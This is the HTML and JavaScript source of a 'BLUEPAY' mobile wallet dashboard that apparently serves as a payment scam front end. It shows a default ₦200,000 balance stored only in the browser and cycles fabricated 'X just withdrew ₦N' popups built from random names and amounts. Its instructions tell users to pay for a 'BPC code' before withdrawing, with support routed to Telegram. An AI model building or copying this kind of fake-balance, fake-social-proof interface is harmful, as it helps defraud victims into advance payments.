<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>BLUEPAY ‚Äî Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root{
      --blue:#0047ff;
      --blue-600:#0a49ff;
      --muted:#6b7b8f;
      --card:#fff;
      --bg:#f5f6fa;
      --success:#22c55e;
      --max-width:930px;
      --radius:14px;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family:'Poppins',system-ui,-apple-system,Segoe UI,Roboto,Arial;
      background:var(--bg);
      color:#0b2033;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      display:flex;
      justify-content:center; /* center on large screens */
    }

    /* wrapper (centered & responsive) */
    .wrapper{
      width:100%;
      max-width:var(--max-width);
      min-height:100vh;
      background:transparent;
      padding-bottom:120px; /* space for bottom nav */
    }

    /* ALERT (moving) */
    .alert-wrap{padding:6px 16px;background:#fff;border-bottom:1px solid #eee}
    .alert{
      max-width:var(--max-width);
      margin:0 auto;
      overflow:hidden;
      white-space:nowrap;
      color:#c53030;
      font-weight:700;
      font-size:13px;
      position:relative;
    }
    .alert span{
      display:inline-block;
      padding-left:100%;
      animation:scroll 12s linear infinite;
    }
    @keyframes scroll{0%{transform:translateX(0)}100%{transform:translateX(-100%)}}

    /* NAV */
    .nav{
      background:var(--blue);
      color:#fff;
      display:flex;
      align-items:center;
      justify-content:space-between;
      padding:14px 18px;
      border-top-left-radius:18px;
      border-top-right-radius:18px;
    }
    .nav .left, .nav .right {display:flex; align-items:center; gap:12px}
    .nav h1{margin:0;font-size:18px; font-weight:800; letter-spacing:1px}
    .nav button{background:transparent;border:0;color:#fff;font-size:20px;cursor:pointer}

    /* SIDEBAR */
    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);display:none;z-index:60}
    .sidebar{
      position:fixed;left:-320px;top:0;bottom:0;width:300px;background:#fff;box-shadow:4px 0 30px rgba(0,0,0,.12);
      padding:18px;z-index:70;transition:all .28s ease;border-top-right-radius:18px;border-bottom-right-radius:18px;
    }
    .sidebar.open{left:0}
    .sidebar h2{color:var(--blue);font-weight:800;margin:6px 0 14px 0}
    .sidebar .btn{display:block;width:100%;padding:12px;border-radius:10px;border:0;margin:8px 0;background:var(--blue);color:#fff;font-weight:700;text-align:center;text-decoration:none}
    .sidebar .small{background:#f4f7fb;color:var(--blue);border:1px solid #e6eef9}

    /* GREETING */
    .greet{
      background:var(--card);
      margin:14px; padding:12px 16px;border-radius:12px;box-shadow:0 6px 18px rgba(8,17,40,0.04);
      display:flex;align-items:center;justify-content:space-between;
    }
    .greet-left{display:flex;align-items:center;gap:12px}
    .avatar{width:44px;height:44px;border-radius:50%;background:#FFC107;display:flex;align-items:center;justify-content:center;font-weight:700}
    .greet h2{font-size:16px;margin:0;font-weight:700}
    .greet p{margin:4px 0 0;color:var(--muted);font-size:13px}

    /* BALANCE CARD */
    .balance{
      background:linear-gradient(90deg,var(--blue),#0a31d9);
      margin:12px 14px;padding:18px;border-radius:14px;color:#fff;box-shadow:0 18px 40px rgba(8,17,40,0.06);
    }
    .balance-top{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap}
    .balance-left{}
    .small-label{font-size:13px;opacity:.95}
    .balance-amount{font-size:28px;font-weight:900;margin-top:6px}
    .withdraw-btn{background:#fff;color:var(--blue);border:0;padding:8px 12px;border-radius:10px;font-weight:800;cursor:pointer}

    .target-box{background:rgba(255,255,255,0.07);margin-top:12px;padding:10px;border-radius:10px}
    .target-row{display:flex;align-items:center;justify-content:space-between;gap:12px}
    .progress{height:10px;background:rgba(255,255,255,0.12);border-radius:999px;overflow:hidden;flex:1;margin-right:12px}
    .progress > i{display:block;height:100%;width:60%;background:rgba(255,255,255,0.95);border-radius:999px;box-shadow:inset 0 -3px 6px rgba(0,0,0,0.06)}
    .target-value{font-weight:800}

    /* OPTIONS grid (3 per row on mobile/tablet) */
    .options{margin:16px;display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
    .opt{background:var(--card);border-radius:12px;padding:16px;text-align:center;box-shadow:0 10px 30px rgba(8,17,40,0.04);text-decoration:none;color:inherit}
    .opt .ic{width:56px;height:56px;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 8px;font-size:22px;color:var(--blue);background:linear-gradient(180deg,#f6fbff,#fff)}
    .opt p{margin:0;font-weight:700}

    /* MORE SERVICES (3 per row) */
    .more{margin:16px;padding:16px;background:var(--card);border-radius:12px;box-shadow:0 10px 30px rgba(8,17,40,0.04)}
    .more h3{margin:0 0 12px 0;color:var(--blue);font-weight:800}
    .services{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
    .service{background:#f4f7fb;border-radius:12px;padding:14px;text-align:center;text-decoration:none;color:inherit;box-shadow:0 6px 24px rgba(8,17,40,0.03)}
    .service i{font-size:20px;color:var(--blue);margin-bottom:8px}

    /* INFO CARD */
    .info{margin:16px;border-radius:12px;padding:12px;background:linear-gradient(90deg,#5b5be6,#c569ff);color:#fff;box-shadow:0 10px 30px rgba(8,17,40,0.06)}
    .info h3{margin:0 0 8px 0;font-size:18px}
    .info .steps{background:rgba(255,255,255,0.07);padding:12px;border-radius:10px}
    .info .step{opacity:.9;padding:10px 6px;font-weight:700;font-size:14px}

    /* bottom nav */
    .bottom{position:fixed;left:50%;transform:translateX(-50%);bottom:12px;z-index:80;background:#fff;padding:10px 14px;border-radius:999px;box-shadow:0 20px 50px rgba(8,17,40,0.08);display:flex;gap:12px;align-items:center}
    .bottom a{display:flex;flex-direction:column;align-items:center;text-decoration:none;color:var(--muted);font-size:12px;width:56px}
    .bottom .plus{background:var(--blue);color:#fff;border-radius:50%;width:56px;height:56px;display:flex;align-items:center;justify-content:center;font-size:22px;box-shadow:0 10px 30px rgba(10,71,255,0.12)}

    /* POPUP (top) */
    .popup{
      position:fixed;left:50%;transform:translateX(-50%) translateY(-30px);
      top:18px;background:var(--success);color:#fff;padding:12px 18px;border-radius:12px;display:flex;align-items:center;gap:10px;box-shadow:0 12px 30px rgba(0,0,0,0.18);
      opacity:0;pointer-events:none;transition:all .45s ease;z-index:90;font-weight:800
    }
    .popup.show{opacity:1;transform:translateX(-50%) translateY(0);pointer-events:auto}

    /* responsive tweaks */
    @media (min-width:1100px){
      .wrapper{padding:18px}
      .options{grid-template-columns:repeat(4,1fr)}
      .services{grid-template-columns:repeat(4,1fr)}
    }

    /* phones/tablets: ensure 3 columns for options/services */
    @media (max-width:520px){
      :root{--max-width:480px}
      .options{grid-template-columns:repeat(3,1fr);gap:10px;margin:12px}
      .services{grid-template-columns:repeat(3,1fr)}
      .greet{margin:12px}
      .balance{margin:12px}
      .more{margin:12px}
      .info{margin:12px}
      .alert-wrap{padding:4px 8px}
      .nav{padding:12px}
      .sidebar{width:260px}
    }

    /* tablet mid */
    @media (min-width:521px) and (max-width:900px){
      :root{--max-width:720px}
      .options{grid-template-columns:repeat(3,1fr)}
    }

    /* accessibility focus */
    button:focus, a:focus{outline:3px solid rgba(0,71,255,0.18);outline-offset:2px}
  </style>
</head>
<body>
  <div class="wrapper" role="main">

    <!-- alert banner -->
    <div class="alert-wrap" aria-hidden="false">
      <div class="alert" role="status" aria-live="polite">
        <span>‚ö†Ô∏è Dear User ‚Äî we're currently experiencing issues with Opay bank transactions. Kindly use another bank or contact your admin. ‚ö†Ô∏è</span>
      </div>
    </div>

    <!-- popup (top) -->
    <div id="popup" class="popup" aria-hidden="true">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M20 6L9 17l-5-5" stroke="white" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"/></svg>
      <div id="popupText">Victory just withdrew ‚Ç¶100,000</div>
    </div>

    <!-- NAV -->
    <header class="nav" role="banner" aria-label="Top navigation">
      <div class="left">
        <button id="menuBtn" aria-label="Open menu">‚ò∞</button>
      </div>
      <h1>BLUEPAY</h1>
      <div class="right">
        <button class="bell" aria-label="Notifications" onclick="window.open('https://t.me/bpc_customer_care','_blank')">
          <i class="fa-solid fa-bell"></i>
        </button>
      </div>
    </header>

    <!-- sidebar & overlay -->
    <div id="overlay" class="overlay" tabindex="-1" aria-hidden="true"></div>
    <aside id="sidebar" class="sidebar" aria-hidden="true" aria-label="Side menu">
      <button id="closeBtn" class="close" aria-label="Close menu" style="background:none;border:0;font-size:20px;align-self:flex-end;cursor:pointer">‚úï</button>
      <h2>üë§ Admin</h2>
      <button id="backDash" class="btn">üè† Back to Dashboard</button>
      <a href="https://t.me/bpc_customer_care" target="_blank" class="btn">üí¨ Support</a>
      <button id="logout" class="btn small">üö™ Logout</button>
    </aside>

    <!-- greeting -->
    <section class="greet" aria-label="User greeting">
      <div class="greet-left">
        <div class="avatar" aria-hidden="true">üë§</div>
        <div>
          <h2 id="username">Hi, User</h2>
          <p>Welcome back ‚Äî here‚Äôs your account summary</p>
        </div>
      </div>
      <div class="greet-right" aria-hidden="true"><i class="fa-solid fa-bell" style="color:var(--blue)"></i></div>
    </section>

    <!-- balance -->
    <section class="balance" aria-label="Available balance">
      <div class="balance-top">
        <div class="balance-left">
          <div class="small-label">Available Balance</div>
          <div class="balance-amount" id="balanceAmount">‚Ç¶200,000</div>
          <div class="target-box" aria-hidden="false">
            <div class="target-row">
              <div style="font-weight:700;color:rgba(255,255,255,0.95)">Daily spend target</div>
              <div class="target-value">‚Ç¶200,000</div>
            </div>
            <div style="height:12px;margin-top:8px;border-radius:999px;overflow:hidden;background:rgba(255,255,255,0.06)">
              <div style="height:12px;width:60%;background:rgba(255,255,255,0.95);border-radius:999px"></div>
            </div>
          </div>
        </div>
        <div style="display:flex;align-items:flex-start">
          <button id="withdrawNow" class="withdraw-btn" aria-label="Withdraw">Withdraw</button>
        </div>
      </div>
    </section>

    <!-- options (3 per row) -->
    <nav class="options" aria-label="Main options">
      <a href="bpc.html" class="opt" aria-label="Buy BPC">
        <div class="ic"><i class="fa-solid fa-wallet"></i></div>
        <p>Buy BPC</p>
      </a>

      <a href="airtime.html" class="opt" aria-label="Airtime">
        <div class="ic"><i class="fa-solid fa-mobile-screen-button"></i></div>
        <p>Airtime</p>
      </a>

      <a href="data.html" class="opt" aria-label="Data">
        <div class="ic"><i class="fa-solid fa-database"></i></div>
        <p>Data</p>
      </a>
    </nav>

    <!-- more services (3 per row) -->
    <section class="more" aria-label="More services">
      <h3>More Services</h3>
      <div class="services">
        <a href="group.html" class="service" aria-label="Group">
          <i class="fa-solid fa-users"></i>
          <div style="font-weight:700;margin-top:6px">Group</div>
        </a>

        <a href="support.html" class="service" aria-label="Support">
          <i class="fa-solid fa-headset"></i>
          <div style="font-weight:700;margin-top:6px">Support</div>
        </a>

        <a href="profile.html" class="service" aria-label="Profile">
          <i class="fa-solid fa-user"></i>
          <div style="font-weight:700;margin-top:6px">Profile</div>
        </a>
      </div>
    </section>

    <!-- important info with animated steps (keeps similar look) -->
    <section class="info" aria-label="Important information">
      <h3>Important Information</h3>
      <div class="steps" aria-live="polite">
        <div class="step" id="stepText">1. Click "Buy BPC" from dashboard</div>
      </div>
    </section>

  </div>

  <!-- bottom nav -->
  <nav class="bottom" aria-label="Bottom navigation">
    <a href="dashboard.html" class="active"><i class="fa-solid fa-wallet"></i><span style="font-weight:700">Wallet</span></a>
    <a href="social.html"><i class="fa-solid fa-comment"></i><span>Social</span></a>
    <a href="new.html" class="plus" aria-label="Create"><span class="plus">+</span></a>
    <a href="data.html"><i class="fa-solid fa-chart-simple"></i><span>Data</span></a>
    <a href="profile.html"><i class="fa-solid fa-user"></i><span>Profile</span></a>
  </nav>

<script>
  // --- Basic data from localStorage ---
  const userName = localStorage.getItem('userName') || 'User';
  const rawBal = localStorage.getItem('bp_balance') || '200000';
  const balanceEl = document.getElementById('balanceAmount');
  document.getElementById('username').textContent = `Hi, ${userName}`;
  balanceEl.textContent = '‚Ç¶' + Number(rawBal).toLocaleString();

  // --- Sidebar open/close ---
  const menuBtn = document.getElementById('menuBtn');
  const sidebar = document.getElementById('sidebar');
  const overlay = document.getElementById('overlay');
  const closeBtn = document.getElementById('closeBtn');
  menuBtn.addEventListener('click', ()=>{ sidebar.classList.add('open'); overlay.style.display='block'; overlay.setAttribute('aria-hidden','false'); sidebar.setAttribute('aria-hidden','false')});
  closeBtn.addEventListener('click', ()=>{ sidebar.classList.remove('open'); overlay.style.display='none'; overlay.setAttribute('aria-hidden','true'); sidebar.setAttribute('aria-hidden','true')});
  overlay.addEventListener('click', ()=>{ sidebar.classList.remove('open'); overlay.style.display='none'; overlay.setAttribute('aria-hidden','true'); sidebar.setAttribute('aria-hidden','true')});

  // back dash & logout
  document.getElementById('backDash').addEventListener('click', ()=>{ sidebar.classList.remove('open'); overlay.style.display='none'; alert('Already on Dashboard!') });
  document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); alert('Logged out'); location.reload()});

  // Withdraw button goes to withdraw.html (user asked to keep)
  document.getElementById('withdrawNow').addEventListener('click', ()=> { window.location.href='withdraw.html'; });

  // --- Popup / live withdraw notifications ---
  const popup = document.getElementById('popup');
  const popupText = document.getElementById('popupText');
  const names = ["Victory","Adola","Queen","John","Blessing","Maro","Divine","Chika","Emeka","Precious"];
  const amounts = [50000,80000,100000,120000,150000,200000,25000,30000];
  function showPopup(){
    const n = names[Math.floor(Math.random()*names.length)];
    const a = amounts[Math.floor(Math.random()*amounts.length)];
    popupText.textContent = `${n} just withdrew ‚Ç¶${a.toLocaleString()}`;
    popup.classList.add('show');
    popup.setAttribute('aria-hidden','false');
    setTimeout(()=>{ popup.classList.remove('show'); popup.setAttribute('aria-hidden','true') }, 4000);
  }
  // show once then every 5s
  setTimeout(showPopup, 600); // small delay on load
  setInterval(showPopup, 5000);

  // --- Info card step animation (cycles 4 steps) ---
  const stepEl = document.getElementById('stepText');
  const steps = [
    "1. Click \"Buy BPC\" from dashboard",
    "2. Fill details and amount",
    "3. Complete payment for BPC code",
    "4. Use code for airtime & withdrawals"
  ];
  let si = 0;
  function cycleSteps(){
    // simple typing-like reveal (char by char)
    const txt = steps[si];
    stepEl.textContent = '';
    let i=0;
    const t = setInterval(()=>{
      stepEl.textContent += txt[i] || '';
      i++;
      if(i>txt.length){ clearInterval(t); si = (si+1)%steps.length; setTimeout(cycleSteps, 1500); }
    }, 28);
  }
  cycleSteps();

  // Accessibility: close sidebar with Escape
  document.addEventListener('keydown', (e)=> {
    if(e.key === 'Escape' && sidebar.classList.contains('open')) {
      sidebar.classList.remove('open'); overlay.style.display='none';
    }
  });

  // Keep popup on top (user insisted)
  // No changes to animation behavior - kept as requested.
</script>
</body>
</html>
